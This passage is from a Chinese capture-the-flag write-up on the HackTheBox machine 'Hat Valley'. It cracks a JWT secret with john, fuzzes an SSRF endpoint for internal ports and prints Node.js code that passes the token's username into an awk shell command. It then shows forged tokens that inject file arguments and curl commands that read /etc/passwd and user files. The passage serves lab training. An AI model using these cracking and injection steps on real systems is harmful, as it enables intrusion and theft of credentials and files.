href="https://pic.imgdb.cn/item/63d5edcfface21e9efe99833.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5edcfface21e9efe99833.jpg"></a></p><p>接下来尝试爆破jwt的密钥，我这里利用的是<code>[jwtcrack](https://github.com/Sjord/jwtcrack)</code>工具中的<code>jwt2john.py</code>和<code>john</code>：</p><p><a href="https://pic.imgdb.cn/item/63d5eddeface21e9efe9b544.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eddeface21e9efe9b544.jpg"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/rainb0w/Desktop]</span><br><span class="line">└──╼ #john --wordlist=/usr/share/wordlists/rockyou.txt hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">123beany123      (?)</span><br><span class="line">1g 0:00:00:04 DONE (2023-01-29 00:16) 0.2444g/s 3259Kp/s 3259Kc/s 3259KC/s 123bettyboo..123arsenal123.</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>成功得到密钥<code>123beany123</code>。接着我们看一下<code>/api/store-statu</code>s路径，可以发现这里可以传入一个url参数，怀疑存在SSRF，试着利用file协议读取&#x2F;etc&#x2F;passwd，未果。设url&#x3D;”<a href="http://127.0.0.1:80"，发现网站被重定向到了http://hat-valley.htb/，尝试FUZZ一下哪些端口被开放：">http://127.0.0.1:80&quot;，发现网站被重定向到了http://hat-valley.htb/，尝试FUZZ一下哪些端口被开放：</a></p><p><a href="https://pic.imgdb.cn/item/63d5edf0face21e9efe9d850.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5edf0face21e9efe9d850.jpg"></a></p><p>FUZZ结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/rainb0w/Desktop]</span><br><span class="line">└──╼ #ffuf -w /usr/share/SecLists/Fuzzing/4-digits-0000-9999.txt -u http://hat-valley.htb/api/store-status?url=%22http://127.0.0.1:FUZZ%22 -fs 0</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v1.4.1-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://hat-valley.htb/api/store-status?url=%22http://127.0.0.1:FUZZ%22</span><br><span class="line"> :: Wordlist         : FUZZ: /usr/share/SecLists/Fuzzing/4-digits-0000-9999.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span><br><span class="line"> :: Filter           : Response size: 0</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">0080                    [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 269ms]</span><br><span class="line">3002                    [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 292ms]</span><br><span class="line">8080                    [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 281ms]</span><br><span class="line">:: Progress: [10000/10000] :: Job [1/1] :: 147 req/sec :: Duration: [0:01:10] :: Errors: 0 ::</span><br></pre></td></tr></table></figure><p>存在3个端口：80，3002，8080。传入<code>url=&quot;http://127.0.0.1:3002&quot;</code>，可以看到该网站的API文档及源码：</p><p><a href="https://pic.imgdb.cn/item/63d5ee04face21e9efe9ff1b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee04face21e9efe9ff1b.jpg"></a></p><p>其中在<code>/api/all-leave</code>中存在任意文件读取漏洞：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/all-leave&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> user_token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> authFailed = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> user = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(user_token) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> decodedToken = jwt.<span class="title function_">verify</span>(user_token, <span class="variable constant_">TOKEN_SECRET</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!decodedToken.<span class="property">username</span>) &#123;</span><br><span class="line"></span><br><span class="line">      authFailed = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      user = decodedToken.<span class="property">username</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(authFailed) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>(&#123;<span class="title class_">Error</span>: <span class="string">&quot;Invalid Token&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!user) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid user&quot;</span>)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> bad = [<span class="string">&quot;;&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;!&quot;</span>,<span class="string">&quot;#&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> badInUser = bad.<span class="title function_">some</span>(<span class="function"><span class="params">char</span> =&gt;</span> user.<span class="title function_">includes</span>(char));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(badInUser) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Bad character detected.&quot;</span>)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="title function_">exec</span>(<span class="string">&quot;awk &#x27;/&quot;</span> + user + <span class="string">&quot;/&#x27; /var/www/private/leave_requests.csv&quot;</span>, &#123;<span class="attr">encoding</span>: <span class="string">&#x27;binary&#x27;</span>, <span class="attr">maxBuffer</span>: <span class="number">51200000</span>&#125;, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stdout) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="keyword">new</span> <span class="title class_">Buffer</span>(stdout, <span class="string">&#x27;binary&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to retrieve leave requests&quot;</span>)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to retrieve leave requests&quot;</span>)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>重点看这一句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;awk &#x27;/&quot; + user + &quot;/&#x27; /var/www/private/leave_requests.csv&quot;</span><br></pre></td></tr></table></figure><p>在这个接口中，首先会对我们的jwt进行解密，接着将其中的username赋值给user变量，而此时我们拥有jwt的密钥，因此我们user变量是我们可控的。</p><p>假设我们伪造的jwt中的<code>username</code>字段为**<code>./&#39; /etc/passwd &#39;</code>**，这样user进行拼接后，完整的命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;/./&#x27; /etc/passwd &#x27;/&#x27; /var/www/private/leave_requests.csv</span><br></pre></td></tr></table></figure><p>熟悉awk命令的都知道，我们利用两个斜杠中的内容为正则表达式，也就是说我们利用’.’这个字符来匹配所有字符，此时我们就可以匹配到<code>/etc/passwd</code>的所有内容。让我们在本地执行一下这个命令：</p><p><a href="https://pic.imgdb.cn/item/63d5ee15face21e9efea2019.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee15face21e9efea2019.jpg"></a></p><p>可以看到<code>/etc/passwd</code>被成功读取。接着我们伪造jwt如下：</p><p><a href="https://pic.imgdb.cn/item/63d5ee22face21e9efea378f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee22face21e9efea378f.jpg"></a></p><p>读取<code>/etc/passwd</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">┌─[✗]─[root@parrot]─[/home/rainb0w/Desktop]</span><br><span class="line">└──╼ #curl http://hat-valley.htb/api/all-leave -b &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii4vJyAvZXRjL3Bhc3N3ZCAnIiwiaWF0IjoxNjc0OTIyMzU5fQ.EXprLPOLwnnrr0aQeEymzkRicpIG-SUIg7DLKeO5qU4&quot;</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:102:105::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:111::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin</span><br><span class="line">avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">whoopsie:x:117:124::/nonexistent:/bin/false</span><br><span class="line">sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin</span><br><span class="line">speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false</span><br><span class="line">nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin</span><br><span class="line">saned:x:121:128::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false</span><br><span class="line">hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false</span><br><span class="line">gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false</span><br><span class="line">bean:x:1001:1001:,,,:/home/bean:/bin/bash</span><br><span class="line">christine:x:1002:1002:,,,:/home/christine:/bin/bash</span><br><span class="line">postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin</span><br><span class="line">mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">sshd:x:130:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">_laurel:x:999:999::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure><p>可以看到这台机子有3个用户，分别是root，bean和christine。尝试读取bean和christine的ssh文件，<code>/home/bean/.ssh/id_rsa</code>和<code>/home/christine/.ssh/id_rsa</code>均未有任何响应。读取bean用户的<code>.bashrc</code>文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/rainb0w/Desktop]</span><br><span class="line">└──╼ #curl http://hat-valley.htb/api/all-leave -b &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii4vJyAvaG9tZS9iZWFuLy5iYXNocmMgJyIsImlhdCI6MTY3NDkyMjM1OX0.-soLFOExCLVbRPy3c1-quqNBqWbHmff2qL4Xu97gdtg&quot;</span><br><span class="line"># ~/.bashrc: executed by bash(1) for non-login shells.</span><br><span class="line"># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</span><br><span class="line"># for examples</span><br><span class="line"># If not running interactively, don&#x27;t do anything</span><br><span class="line">case $- in</span><br><span class="line">    *i*) ;;</span><br><span class="line">      *) return;;</span><br><span class="line">esac</span><br><span class="line"># don&#x27;t put duplicate lines or lines starting with space in the history.</span><br><span class="line"># See bash(1) for more options</span><br><span class="line">HISTCONTROL=ignoreboth</span><br><span class="line"># append to the history file, don&#x27;t overwrite it</span><br><span class="line">shopt -s histappend</span><br><span class="line"># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">HISTFILESIZE=2000</span><br><span class="line"># check the window size after each command and, if necessary,</span><br><span class="line"># update the values of LINES and COLUMNS.</span><br><span class="line">shopt -s checkwinsize</span><br><span class="line"># If set, the pattern &quot;**&quot; used in a pathname expansion context will</span><br><span class="line"># match all files and zero or more directories and subdirectories.</span><br><span class="line">#shopt -s globstar</span><br><span class="line"># make less more friendly for non-text input files, see lesspipe(1)</span><br><span class="line">[ -x /usr/bin/lesspipe ] &amp;&amp; eval &quot;$(SHELL=/bin/sh lesspipe)&quot;</span><br><span class="line"># set variable identifying the chroot you work in (used in the prompt below)</span><br><span class="line">if [ -z &quot;$&#123;debian_chroot:-&#125;&quot; ] &amp;&amp; [ -r /etc/debian_chroot ]; then</span><br><span class="line">    debian_chroot=$(cat /etc/debian_chroot)</span><br><span class="line">fi</span><br><span class="line"># set a fancy prompt (non-color, unless we know we &quot;want&quot; color)</span><br><span class="line">case &quot;$TERM&quot; in</span><br><span class="line">    xterm-color|*-256color) color_prompt=yes;;</span><br><span class="line">esac</span><br><span class="line"># uncomment for a colored prompt, if the terminal has the capability; turned</span><br><span class="line"># off by default to not distract the user: the focus in a terminal window</span><br><span class="line"># should be on the output of commands, not on the prompt</span><br><span class="line">#force_color_prompt=yes</span><br><span class="line">if [ -n &quot;$force_color_prompt&quot; ]; then</span><br><span class="line">    if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then</span><br><span class="line"># We have color support; assume it&#x27;s compliant with Ecma-48</span><br><span class="line"># (ISO/IEC-6429). (Lack of such support is extremely rare, and such</span><br><span class="line"># a case would tend to support setf rather than setaf.)</span><br><span class="line">color_prompt=yes</span><br><span class="line">    else</span><br><span class="line">color_prompt=</span><br><span class="line">    fi</span><br><span class="line">fi</span><br><span class="line">if [ &quot;$color_prompt&quot; = yes ]; then</span><br><span class="line">    PS1=&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;</span><br><span class="line">else</span><br><span class="line">    PS1=&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#x27;</span><br><span class="line">fi</span><br><span class="line">unset color_prompt force_color_prompt</span><br><span class="line"># If this is an xterm set the title to user@host:dir</span><br><span class="line">case &quot;$TERM&quot; in</span><br><span class="line">xterm*|rxvt*)</span><br><span class="line">    PS1=&quot;\[\e]0;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h: \w\a\]$PS1&quot;</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line"># enable color support of ls and also add handy aliases</span><br><span class="line">if [ -x /usr/bin/dircolors ]; then</span><br><span class="line">    test -r ~/.dircolors &amp;&amp; eval &quot;$(dircolors -b ~/.dircolors)&quot; || eval &quot;$(dircolors -b)&quot;</span><br><span class="line">    alias ls=&#x27;ls --color=auto&#x27;</span><br><span class="line">    #alias dir=&#x27;dir --color=auto&#x27;</span><br><span class="line">    #alias vdir=&#x27;vdir --color=auto&#x27;</span><br><span class="line">    alias grep=&#x27;grep --color=auto&#x27;</span><br><span class="line">    alias fgrep=&#x27;fgrep --color=auto&#x27;</span><br><span class="line">    alias egrep=&#x27;egrep --color=auto&#x27;</span><br><span class="line">fi</span><br><span class="line"># colored GCC warnings and errors</span><br><span class="line">#export GCC_COLORS=&#x27;error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01&#x27;</span><br><span class="line"># some more ls aliases</span><br><span class="line">alias ll=&#x27;ls -alF&#x27;</span><br><span class="line">alias la=&#x27;ls -A&#x27;</span><br><span class="line">alias l=&#x27;ls -CF&#x27;</span><br><span class="line"># custom</span><br><span class="line">alias backup_home=&#x27;/bin/bash /home/bean/Documents/backup_home.sh&#x27;</span><br><span class="line"># Add an &quot;alert&quot; alias for long running commands.  Use like so:</span><br><span class="line">#   sleep 10; alert</span><br><span class="line">alias alert=&#x27;notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e &#x27;\&#x27;&#x27;s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//&#x27;\&#x27;&#x27;)&quot;&#x27;</span><br><span class="line"># Alias definitions.</span><br><span class="line"># You may want to put all your additions into a separate file like</span><br><span class="line"># ~/.bash_aliases, instead of adding them here directly.</span><br><span class="line"># See /usr/share/doc/bash-doc/examples in the bash-doc package.</span><br><span class="line">if [ -f ~/.bash_aliases ]; then</span><br><span class="line">    . ~/.bash_aliases</span><br><span class="line">fi</span><br><span class="line"># enable programmable completion features (you don&#x27;t need to enable</span><br><span class="line"># this, if it&#x27;s already enabled in /etc/bash.bashrc and /etc/profile</span><br><span class="line"># sources /etc/bash.bashrc).</span><br><span class="line">if ! shopt -oq posix; then</span><br><span class="line">  if [ -f /usr/share/bash-completion/bash_completion ]; then</span><br><span class="line">    . /usr/share/bash-completion/bash_completion</span><br><span class="line">  elif [ -f /etc/bash_completion ]; then</span><br><span class="line">    . /etc/bash_completion</span><br><span class="line">  fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>发现有一个<code>backup_home.sh</code>文件，怀疑与home目录的备份有关系，尝试读取<code>/home/bean/Documents/backup_home.sh</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/rainb0w/Desktop]</span><br><span class="line">└──╼ #curl http://hat-valley.htb/api/all-leave -b &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii4vJyAvaG9tZS9iZWFuL0RvY3VtZW50cy9iYWNrdXBfaG9tZS5zaCAnIiwiaWF0IjoxNjc0OTIyMzU5fQ.iAGaOQVbBg1rKAdG1H3zeOosRwvwW7yP8uIFsDtXQ5s&quot;</span><br><span class="line">#!/bin/bash</span><br><span class="line">mkdir /home/bean/Documents/backup_tmp</span><br><span class="line">cd /home/bean</span><br><span class="line">tar --exclude=&#x27;.npm&#x27; --exclude=&#x27;.cache&#x27; --exclude=&#x27;.vscode&#x27; -czvf 